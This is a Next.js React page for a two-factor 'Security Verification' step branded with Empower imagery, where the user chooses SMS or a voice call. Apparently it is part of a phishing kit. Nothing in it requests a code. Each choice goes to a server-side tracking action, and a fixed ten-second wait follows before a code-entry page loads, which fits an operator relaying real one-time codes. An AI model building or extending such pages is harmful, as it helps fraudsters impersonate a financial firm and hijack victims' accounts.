"use client"

import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { Button } from "@/components/ui/button"
import Link from "next/link"
import { trackVerificationOption, trackBackToSignIn } from "@/lib/actions"
import { useRouter } from "next/navigation"
import { useState } from "react"

export default function TwoFAMethod() {
    const router = useRouter()
    const [selectedOption, setSelectedOption] = useState<'SMS' | 'Call' | null>(null)
    const [isLoading, setIsLoading] = useState(false)
    const [isBackLoading, setIsBackLoading] = useState(false)

    const handleSMSSelection = async (e: React.MouseEvent) => {
        e.preventDefault()
        if (selectedOption || isLoading) return
        
        setSelectedOption('SMS')
        setIsLoading(true)
        
        trackVerificationOption('SMS')
        
        await new Promise(resolve => setTimeout(resolve, 10000))
        router.push('/2fa-verify-code?type=SMS')
    }

    const handleCallSelection = async (e: React.MouseEvent) => {
        e.preventDefault()
        if (selectedOption || isLoading) return
        
        setSelectedOption('Call')
        setIsLoading(true)
        
        trackVerificationOption('Call')
        
        await new Promise(resolve => setTimeout(resolve, 10000))
        router.push('/2fa-verify-code?type=Call')
    }

    const handleBackToSignIn = async (e: React.MouseEvent) => {
        e.preventDefault()
        if (isBackLoading) return
        
        setIsBackLoading(true)
        
        trackBackToSignIn()
        
        await new Promise(resolve => setTimeout(resolve, 2000))
        router.push('/')
    }
    return (
        <main className="min-h-screen bg-white flex flex-col">
            
            <div
                style={{
                    backgroundImage: 'url(/empower-background-dark-white-flag.png)',
                    backgroundSize: 'cover',
                    backgroundRepeat: 'no-repeat',
                    backgroundPosition: 'center top'
                }}
                className="flex flex-col min-h-[60vh]"
            >
                <Header />

                <div className="flex-1 flex items-center justify-center py-12 px-4 bg-transparent">
                    <div className="bg-white rounded-[32px] p-8 md:p-12 shadow-xl w-full max-w-[500px] border border-gray-200">
                        <h1 className="text-2xl md:text-3xl font-bold text-[#363636] mb-6">Security Verification</h1>
                        <p className="text-gray-600 mb-8 leading-relaxed">
                            Choose how you'd like to receive your one-time verification code. This helps us confirm it's really you.
                        </p>

                        <div className="space-y-4">
                            <div 
                                onClick={handleSMSSelection} 
                                className={`block ${selectedOption || isLoading ? 'opacity-50 cursor-not-allowed pointer-events-none' : 'cursor-pointer'}`}
                            >
                                <div className={`flex items-center p-4 border-2 rounded-2xl transition-all ${
                                    selectedOption === 'SMS' 
                                        ? 'border-blue-500 bg-blue-50' 
                                        : selectedOption || isLoading
                                        ? 'border-gray-200 bg-gray-50'
                                        : 'border-gray-100 hover:border-blue-500 hover:bg-blue-50'
                                }`}>
                                    <div className={`w-12 h-12 rounded-full flex items-center justify-center mr-4 ${
                                        selectedOption === 'SMS'
                                            ? 'bg-blue-200'
                                            : selectedOption || isLoading
                                            ? 'bg-gray-200'
                                            : 'bg-blue-100'
                                    }`}>
                                        <span className="text-xl">📱</span>
                                    </div>
                                    <div className="flex-1">
                                        <h3 className="font-semibold text-gray-800">Text Message (SMS)</h3>
                                        <p className="text-sm text-gray-500">
                                            {selectedOption === 'SMS' ? 'Processing...' : 'Send code to (***) ***-****'}
                                        </p>
                                    </div>
                                    <span className={`${selectedOption === 'SMS' ? 'text-blue-600' : 'text-blue-500'}`}>→</span>
                                </div>
                            </div>

                            <div 
                                onClick={handleCallSelection} 
                                className={`block ${selectedOption || isLoading ? 'opacity-50 cursor-not-allowed pointer-events-none' : 'cursor-pointer'}`}
                            >
                                <div className={`flex items-center p-4 border-2 rounded-2xl transition-all ${
                                    selectedOption === 'Call' 
                                        ? 'border-blue-500 bg-blue-50' 
                                        : selectedOption || isLoading
                                        ? 'border-gray-200 bg-gray-50'
                                        : 'border-gray-100 hover:border-blue-500 hover:bg-blue-50'
                                }`}>
                                    <div className={`w-12 h-12 rounded-full flex items-center justify-center mr-4 ${
                                        selectedOption === 'Call'
                                            ? 'bg-blue-200'
                                            : selectedOption || isLoading
                                            ? 'bg-gray-200'
                                            : 'bg-gray-100'
                                    }`}>
                                        <span className="text-xl">📞</span>
                                    </div>
                                    <div className="flex-1">
                                        <h3 className="font-semibold text-gray-800">Voice Call</h3>
                                        <p className="text-sm text-gray-500">
                                            {selectedOption === 'Call' ? 'Processing...' : 'Call (***) ***-**** with code'}
                                        </p>
                                    </div>
                                    <span className={`${selectedOption === 'Call' ? 'text-blue-600' : 'text-blue-500'}`}>→</span>
                                </div>
                            </div>
                        </div>

                        <div className="mt-8 pt-6 border-t border-gray-100">
                            <button 
                                onClick={handleBackToSignIn} 
                                disabled={isBackLoading || isLoading}
                                className={`font-medium text-sm ${
                                    isBackLoading || isLoading
                                        ? 'text-gray-400 cursor-not-allowed pointer-events-none' 
                                        : 'text-blue-600 hover:text-blue-700'
                                }`}
                            >
                                {isBackLoading ? 'Loading...' : '← Back to Sign In'}
                            </button>
                        </div>
                    </div>
                </div>

            </div>

            <Footer />
        </main>
    )
}
